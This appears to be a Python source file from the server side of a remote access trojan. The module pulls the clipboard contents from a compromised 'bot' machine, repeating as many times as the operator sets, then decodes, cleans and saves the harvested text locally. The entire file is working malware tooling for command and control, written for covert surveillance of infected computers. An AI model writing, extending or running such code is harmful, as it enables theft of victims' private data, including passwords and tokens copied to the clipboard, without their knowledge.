# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from base64 import b64decode
from os import mkdir

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6"],
            "Description": "Retrieve or synchronize the bot's clipboard (saves locally, supports text and base64).",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "Count to synchronize/read the clipboard (how many times, leave empty for 1): ",
            "Local output name to save clipboard content to (leave empty for <RANDOM>): "
        ]

    def setup(self, set_options):
        count = set_options[0]
        output_name = set_options[1]

        if not count:
            count = 1
        if not str(count).isdigit() or int(count) < 1:
            self._view.display_error("Invalid count (should be a positive whole number).")
            return False, None

        if not output_name:
            output_name = random_string(8) + ".txt"
        if "." not in output_name:
            output_name = output_name + ".txt"

        # monitor_time is what the bot side uses (the bot reads the clipboard
        # approximately once per second), so count maps directly to it.
        return True, {
            "monitor_time": int(count),
            "count": int(count),
            # The server saves the clipboard locally, so no remote file is used.
            "output_file": "",
            "response_options": {
                "output_name": output_name
            }
        }

    def process_response(self, response, response_options):
        output_name = response_options.get("output_name", "")
        content = self._decode_content(response)
        display = self._clean_clipboard(content)

        self._view.output_separator()
        self._view.output("Clipboard content:")
        self._view.output(display)

        if not display.strip():
            self._view.output("(The clipboard was empty, nothing was saved.)", "info")
            return

        if output_name:
            output_file = path.join(OUTPUT_DIRECTORY, output_name)

            if not path.isdir(OUTPUT_DIRECTORY):
                mkdir(OUTPUT_DIRECTORY)

            with open(output_file, "wb") as open_file:
                open_file.write(display.encode("utf-8"))

            self._view.output("Saved clipboard to: {}".format(path.realpath(output_file)), "info")

    @staticmethod
    def _decode_content(response):
        """Decodes a raw response which may be plain UTF-8 text or base64 binary."""
        try:
            text = response.decode("utf-8").strip()
        except UnicodeDecodeError:
            text = None

        if text is None:
            # Not valid UTF-8 text, so the response is likely base64 encoded binary.
            try:
                return b64decode(response).decode("utf-8")
            except Exception:
                return response.decode("utf-8", errors="replace")

        # Strip a possible Python 3 bytes representation, e.g. b'Hello'.
        if text.startswith("b'") and text.endswith("'"):
            text = text[2:-1]
        elif text.startswith('b"') and text.endswith('"'):
            text = text[2:-1]

        return text

    @staticmethod
    def _clean_clipboard(content):
        """Removes the '[clipboard] HH:MM:SS - ' prefix the bot prints for every read."""
        lines = []
        for line in content.splitlines():
            line = line.strip()
            if line.startswith("[clipboard]") and " - " in line:
                line = line.split(" - ", 1)[1]
            if line:
                lines.append(line)
        return "\n".join(lines)